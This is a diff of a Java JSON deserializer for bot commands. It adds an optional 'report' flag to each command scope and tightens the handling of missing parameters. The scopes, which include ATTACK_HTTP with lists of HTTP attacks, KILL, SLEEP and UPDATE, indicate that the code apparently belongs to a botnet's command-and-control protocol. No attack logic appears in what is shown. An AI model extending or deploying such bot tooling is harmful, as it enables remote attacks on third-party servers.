@@ -94,22 +94,28 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
       switch (cmd.getScope()) {
 
         case ATTACK_HTTP:
-          if (!node.hasNonNull("attacks")) {
+          if (node.hasNonNull("attacks")) {
+            List<HttpAttack> httpAttacks = new ArrayList<>();
+            Iterator<JsonNode> i = node.get("attacks").elements();
+            while (i.hasNext()) {
+              JsonNode n = i.next();
+              HttpAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpAttack.class);
+              httpAttacks.add(attack);
+            }
+
+            cmd.getParams().put("attacks", httpAttacks);
+          } else {
             throw new IOException("Cannot read parameters [attacks] for scope [ATTACK_HTTP] (missing)");
           }
-          List<HttpAttack> httpAttacks = new ArrayList<>();
-          Iterator<JsonNode> i = node.get("attacks").elements();
-          while (i.hasNext()) {
-            JsonNode n = i.next();
-            HttpAttack attack = ctx.readValue(n.traverse(parser.getCodec()), HttpAttack.class);
-            httpAttacks.add(attack);
-          }
-
-          cmd.getParams().put("attacks", httpAttacks);
 
           if (node.hasNonNull("delay")) {
             final Interval attackHttpDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", attackHttpDelay);
+          }
+
+          if (node.hasNonNull("report")) {
+            final Boolean attackhttpReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", attackhttpReport);
           }
 
           break;
@@ -125,6 +131,11 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
             cmd.getParams().put("delay", calmdownDelay);
           }
 
+          if (node.hasNonNull("report")) {
+            final Boolean calmdownReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", calmdownReport);
+          }
+
           break;
 
         case KILL:
@@ -136,6 +147,11 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (node.hasNonNull("delay")) {
             final Interval killDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", killDelay);
+          }
+
+          if (node.hasNonNull("report")) {
+            final Boolean killReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", killReport);
           }
 
           break;
@@ -166,12 +182,22 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
             cmd.getParams().put("delay", restartDelay);
           }
 
+          if (node.hasNonNull("report")) {
+            final Boolean restartReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", restartReport);
+          }
+
           break;
 
         case SAVE_CONFIG:
           if (node.hasNonNull("delay")) {
             final Interval saveConfigDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", saveConfigDelay);
+          }
+
+          if (node.hasNonNull("report")) {
+            final Boolean saveConfigReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", saveConfigReport);
           }
 
           break;
@@ -187,6 +213,11 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
             cmd.getParams().put("delay", sleepDelay);
           }
 
+          if (node.hasNonNull("report")) {
+            final Boolean sleepReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", sleepReport);
+          }
+
           break;
 
         case UPDATE:
@@ -194,11 +225,18 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
             final Map<String,String> settings =
                 new ObjectMapper().readValue(node.get("settings").traverse(), new TypeReference<Map<String,String>>(){});
             cmd.getParams().put("settings", settings);
+          } else {
+            throw new IOException("Cannot read parameters [settings] for scope [UPDATE] (missing)");
           }
 
           if (node.hasNonNull("delay")) {
             final Interval updateDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", updateDelay);
+          }
+
+          if (node.hasNonNull("report")) {
+            final Boolean updateReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", updateReport);
           }
 
           break;
@@ -207,6 +245,11 @@ public class BotCommandDeserializer extends StdDeserializer<BotCommand> {
           if (node.hasNonNull("delay")) {
             final Interval wakeupDelay = Interval.valueOf(node.get("delay").asText());
             cmd.getParams().put("delay", wakeupDelay);
+          }
+
+          if (node.hasNonNull("report")) {
+            final Boolean wakeupReport = Boolean.valueOf(node.get("report").asBoolean());
+            cmd.getParams().put("report", wakeupReport);
           }
 
           break;
